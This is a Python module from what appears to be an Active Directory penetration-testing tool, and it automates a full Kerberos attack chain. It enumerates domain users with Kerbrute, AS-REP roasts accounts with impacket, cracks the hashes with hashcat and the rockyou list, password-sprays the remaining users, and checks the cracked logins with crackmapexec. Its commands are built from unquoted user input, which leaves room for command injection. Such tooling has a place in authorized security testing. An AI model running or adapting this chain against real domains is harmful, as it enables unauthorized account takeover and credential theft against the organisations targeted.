from termcolor import colored
import src.modules.core as core
import src.modules.config as config
import os

def synchrotime(dc_ip):
    print(colored("\n[*] Synchronizing time with domain controller.",'blue')) 
    out, err = core.execute_command("timedatectl set-ntp 0")
    if err:
        print(colored(f"[-] Error: {err.strip()}",'red'))
        return
    
    out, err = core.execute_command(f"ntpdate {dc_ip}")
    if err:
        print(colored(f"[-] Error: {err.strip()}",'red'))
        return
    print(colored("[+] Time synchronized",'green'))

def krbenum(domain, dc_ip, usersfile):
    print(colored("\n[*] Try Kerberos user enumeration with Kerbrute.",'blue'))
    print(colored(f"[*] File with usernames used: {usersfile}",'grey'))
    out, err = core.execute_command_with_timeout(f"{config.tools_dir}/kerbrute --dc {dc_ip} userenum -d {domain} {usersfile}")
    if err:
        print(colored(f"[-] Error: {err.strip()} \n[-] Exiting...",'red'))
        exit(1)
    found = 0
    lines = out.split("\n")
    user_list = []
    try:
        for i,line in enumerate(lines):
            if("[+]" in line):
                found +=1
                out = line.strip()
                res = out.split(":", 3)[-1]
                user = res.split("@", 1)[0]
                user_list.append(user.strip())
                if i < 50:
                    print(user.strip())
                i+=1    
    except Exception as e:
        print(colored(f"[-] Error occured: {e}",'red'))
        exit(1)
    if not found:
        print(colored("[-] No users found",'yellow'))
        exit(1)
    else:
        file = "krb_enum_users.txt"
        with open(file, "w") as f:
            for user in user_list:
                f.write(user+"\n")
        print(colored(f"[+] Success! Full results saved in {config.out_folder}/{file}.",'green'))
    return file

def concatenate_and_remove_duplicates(file_list, output_file_path):
    print(colored("\n[*] Creating a concatenated userlist (LDAP+SMB+user_enum_results).",'blue'))
    try:
        contents = []
        for file in file_list:
            if os.path.exists(file):
                f = open(file, "r")
                contents.append(f.read())           
        combined = '\n'.join(contents) 
        # Split the combined content into lines and remove duplicates
        unique_lines = list(set(combined.splitlines()))
        with open(output_file_path, 'w') as output_file:
            output_file.write('\n'.join(line for line in unique_lines if line != '')) # save only non-empty lines
        print(colored(f"[+] Userlist created successfully and saved in {config.out_folder}/{output_file_path}",'green'))
    except Exception as e:
        print(colored(f"[-] Error occurred: {e}", 'red'))

def asreproast(domain, dc_ip, usersfile):
    print(colored("\n[*] Looking for users with no-preauth required.",'blue'))
    out, err = core.execute_command(f"impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -usersfile {usersfile} -format hashcat")
    if err:
        print(colored(f"[-] Error: {err.strip()} \n[-] Exiting...",'red'))
        exit(1)
    hash_list = []
    found = 0
    lines = out.split("\n")
    try:
        for line in lines:
            if '[-] Error' in line:
                print(colored(f"{line.strip()} \n[-] Exiting...",'red'))
                return
            elif line.startswith('$'):
                found +=1
                hash = line.strip()
                if found == 1:
                    print(colored("[+] Success! Hashes acquired:",'green'))
                if found < 5:
                    print(hash + '\n')
                hash_list.append(line.strip()) 
    except Exception as e:
        print(colored(f"[-] Error occured: {e}",'red'))
        exit(1)
    if not found:
        print(colored("[-] Users with 'do not require kerberos preauth' not found",'yellow'))
    else:
        with open("krb_asrep_hashes.txt", "w") as f:
            for hash in hash_list:
                f.write(hash + '\n')
        print(colored(f"[+] Full results saved to {config.out_folder}/krb_asrep_hashes.txt",'grey'))
    return hash_list

def crack_hashes(hash_list, hashcode, crack_list):
    pwned_users = []
    file = f"krb_userpass_{hashcode}.txt"
    with open(file, "w") as f:
        while len(hash_list) > 0:
            print(colored("[*] Trying to crack hash...", 'blue'))
            if crack_list is None:
                crack_list = f"{config.lists_dir}/rockyou.txt"
            out, err = core.execute_command(f"hashcat {hash_list[0]} {crack_list}")
            if err:
                print(colored(f"[-] Error: {err.strip()} \n[-] Exiting...",'red'))
                exit(1)
            cracked = False
            lines = out.split("\n")
            for line in lines:
                if(line.startswith("$")):
                    cracked = True
                    hash = line.strip()
                    if hashcode == "18200": # asrep hash
                        # save to file as user:pass
                        res = hash.split("$", 3)[-1]
                        user = res.split("@", 1)[0]
                        pwd = hash.split(":", 2)[-1]
                    elif hashcode == "13100": # spn hash 
                        res = hash.split("*", 1)[-1]
                        user = res.split("$", 1)[0]
                        pwd = hash.split(":", 2)[-1]
                    if user:
                        print(colored(user + ":" + pwd, 'blue', 'on_white'))
                        f.write(user + ":" + pwd + "\n")
                        pwned_users.append(user)
                    else:
                        print(colored("[-] Something went wrong", 'yellow'))
                        exit(1)
            if not cracked:
                print(colored("[-] Could not crack the hash with given wordlist", 'yellow'))
            hash_list.pop(0)
    return pwned_users, file

def remove_pwned(usersfile, pwned_users):
    print(colored("[*] Removing pwned users from password spray list.", 'blue'))
    old_file = open(usersfile, "r") 
    new_file = "krb_users_to_spray.txt"
    n = open(new_file, "w")
    users = old_file.readlines()
    for pwned in pwned_users:
        for user in users:
            if user.strip() == pwned.strip():
                users.remove(user)
    for new in users:
        n.write(new)
    print(colored("[+] Done.", 'green'))
    return new_file     
 
def pass_spray(dc_ip, domain, usersfile, password):
    print(colored("\n[*] Password spray with kerbrute through Kerberos Pre-Authentication mechanism.", 'blue'))
    print(colored(f"[*] File with usernames used: {usersfile}",'grey'))
    if password is None:
        password = "password"
        print(colored(f"[*] Using default password for spray: \'{password}\'",'grey'))
    print(colored(f"[*] Spraying with \'{password}\' password...",'grey'))
    out, err = core.execute_command_with_timeout(f"{config.tools_dir}/kerbrute --dc {dc_ip} passwordspray -d {domain} {usersfile} {password}")
    if err:
        print(colored(f"[-] Error: {err.strip()} \n[-] Exiting...",'red'))
        exit(1)
    found = 0
    lines = out.split("\n")
    res_list = []
    try:
        for line in lines:
            if("[+]" in line):
                found +=1
                out = line.strip()
                res = out.split(":", 3)[-1]
                user = res.split("@", 1)[0]
                pwd = res.split(":")[-1]
                pwd = pwd.split("\x1b")[0] # escape character
                res_list.append((user,pwd))
                print(colored(user.strip()+":"+pwd.strip(), 'blue', 'on_white'))
    except Exception as e:
        print(colored(f"[-] Error occured: {e}",'red'))
        exit(1)
    if not found:
        print(colored("[-] No users found",'yellow'))
        exit(1)
    else:
        file = f"krb_spray_{password}.txt"
        with open(file, "w") as f:
            for user,pwd in res_list:
                f.write(f"{user.strip()}:{pwd}\n")
        print(colored(f"[+] Success! Results saved in {config.out_folder}/{file}.",'green'))
    return file


def validatecreds(dc_ip, credsfile):
    print(colored("\n[*] Validating credentials with Crackmapexec.", 'blue'))
    pwned = []
    try:
        with open(credsfile, "r") as f:
            lines = f.readlines()
            for line in lines:
                if ':' not in line:
                    print(colored(f"[-] Make sure supplied data is in correct format \'user:password\'. \n[-] Exiting...",'red'))
                    exit(1) 
                user = line.split(":", 1)[0]
                pwd = line.split(":", 1)[-1].strip()
                out, err = core.execute_command(f"crackmapexec smb {dc_ip} -u {user} -p {pwd}")
                if err:
                    print(colored(f"[-] Error: {err.strip()} \n[-] Exiting...",'red'))
                    exit(1)
                print(out)
                if "[+]" in out:
                    pwned.append(user)
    except Exception as e:
        print(colored(f"[-] Error occured: {e}",'red'))
        exit(1)
    return pwned

def restoretime():
    print(colored("\n[*] Time back to previous configuration.", 'blue'))
    out, err = core.execute_command("timedatectl set-ntp 1")
    if err:
        print(colored(f"[-] Error: {err.strip()} \n[-] Exiting...",'red'))
        exit(1)


def krbinit_full(dc_ip, domain, spraypass, enumlist, cracklist, nocrack):
    synchrotime(dc_ip)
    # create folder before first 'save to file' operation
    if not config.out_folder:
        core.makeworkdir()
    # step 1: user enumeration
    if enumlist is None:
        enumlist = f"{config.lists_dir}/usernames.txt"
    users_file = krbenum(domain, dc_ip, enumlist)
    # step 2: as-rep roasting: retreive users from smb meteadata scan, ldap scan, and kerberos user enumeration scan
    concatenate_and_remove_duplicates([users_file, "smb_meta_parsed_users.txt", "ldap_users.txt"], "full_asrep_userlist.txt")
    users_full_file = "full_asrep_userlist.txt"
    hash_list = asreproast(domain, dc_ip, users_full_file)
    if nocrack is False:
        pwned_users, pwned_file = crack_hashes(hash_list, "18200", cracklist) # 18200 is asrep hash code
        validatecreds(dc_ip, pwned_file)
    else: pwned_users = None
    if pwned_users:
        pass_spray_file = remove_pwned(users_full_file, pwned_users) 
    else: pass_spray_file = users_full_file
    # step 3: password spray
    res_file = pass_spray(dc_ip, domain, pass_spray_file, spraypass)
    validatecreds(dc_ip, res_file)

# as-rep -> pass spray
def krb_spray(dc_ip, domain, spraypass, userslist, cracklist, nocrack):
    synchrotime(dc_ip)
    if not config.out_folder:
        core.makeworkdir()
    hash_list = asreproast(domain, dc_ip, userslist)
    if not hash_list:
        return
    if nocrack is False:
        pwned_users, pwned_file = crack_hashes(hash_list, "18200", cracklist)
        validatecreds(dc_ip, pwned_file)
    else: pwned_users = None
    if pwned_users: 
        pass_spray_file = remove_pwned(userslist, pwned_users) 
    else: pass_spray_file = userslist
    # step 3: password spray
    res_file = pass_spray(dc_ip, domain, pass_spray_file, spraypass)
    validatecreds(dc_ip, res_file)
